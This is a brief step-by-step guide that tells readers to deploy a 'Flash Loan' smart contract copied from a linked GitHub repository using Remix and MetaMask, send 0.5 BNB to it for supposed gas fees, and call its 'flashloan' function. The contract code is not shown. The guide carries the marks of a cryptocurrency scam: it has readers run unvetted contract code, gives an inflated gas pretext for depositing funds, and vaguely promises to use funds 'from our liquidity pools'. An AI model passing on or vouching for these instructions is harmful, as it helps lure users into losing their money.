STEPS:

Before starting, install and setup MetaMask in Chrome Browser.

1. Open and setup Remix in browser https://remix.ethereum.org

2. Copy the Contract code https://github.com/Thomasxyz90/Flash-Loan/blob/main/Flash%20Loan%20Solidity%20Contract

3. Create new file in Remix and paste Contract code and wait for everything to load

4. Enter your token details and deploy the contract

5. Get the Contract address from Remix

6. Send 0.5 BNB to the contract for gas fee for all swaps (There are going to be many swaps to use all funds from out liquidity pools. So, its going to take around 0.15-0.2 BNB fees)

7. Call ‘flashloan’ function in Remix.
